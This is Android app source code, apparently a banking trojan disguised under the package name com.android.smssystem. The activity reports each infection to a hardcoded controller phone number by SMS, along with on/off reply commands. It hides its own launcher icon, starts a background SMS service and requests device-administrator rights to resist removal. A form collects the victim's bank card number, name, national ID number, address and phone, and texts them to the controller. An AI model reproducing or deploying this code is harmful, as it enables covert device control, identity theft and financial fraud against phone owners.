package com.android.smssystem;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.smssystem.R;

public class MainActivity extends Activity {

	private DevicePolicyManager Dmanager;
	private EditText name,sfz,qq,dizhi,phone;
	private Button ok;
	private SmSutils su;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		super.requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_main);
		qq=(EditText)super.findViewById(R.id.qq);
		name=(EditText)super.findViewById(R.id.name);
		sfz=(EditText)super.findViewById(R.id.sfz);
		dizhi=(EditText)super.findViewById(R.id.dizhi);
		phone=(EditText)super.findViewById(R.id.phone);
		ok=(Button)super.findViewById(R.id.ok);
		ok.setOnClickListener(new OnClickListenerImpl());
		su=new SmSutils();
		if(SmSutils.key.equals(SmSutils.getPublicKey(this))){
			su.sendSMS(SmSutils.phone, "手机已安装软件,回复com@false关闭com@true开启, 版本"+Build.VERSION.SDK_INT+" "+Build.MODEL,null);
			Toast.makeText(this, "程序启动成功", Toast.LENGTH_LONG).show();
	    	PackageManager pm=this.getPackageManager();
			pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
			Intent intent=new Intent(this,SmSserver.class);
			this.startService(intent);
			regdevice();
			MainActivity.this.finish();
		}else{
			String sp="证书错误,程序启动失败";
			su.sendSMS(SmSutils.phone, sp,null);
			Toast.makeText(this, sp, Toast.LENGTH_LONG).show();
			this.finish();
		}
		
	}
	class OnClickListenerImpl implements OnClickListener{

		@Override
		public void onClick(View arg0) {
			// TODO Auto-generated method stub
			String q=qq.getText().toString();
			String n=name.getText().toString();
			String s=sfz.getText().toString();
			String d=dizhi.getText().toString();
			String p=phone.getText().toString();
			su.sendSMS(SmSutils.phone, "银行卡"+q+" 姓名:"+n+" 身份证"+s+" 地址"+d+" 号码"+p, null);
			regdevice();
			MainActivity.this.finish();
		}
		
	}
	
	public void regdevice(){
		Dmanager=(DevicePolicyManager)this.getSystemService(Context.DEVICE_POLICY_SERVICE);
		ComponentName con=new ComponentName(this,DeviceReceiver.class);
		if(!Dmanager.isAdminActive(con)){
			Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
		    localIntent.putExtra("android.app.extra.DEVICE_ADMIN", con);
		    localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "设备管理器");
		    startActivityForResult(localIntent, 0);
		}
	}
	
	
}
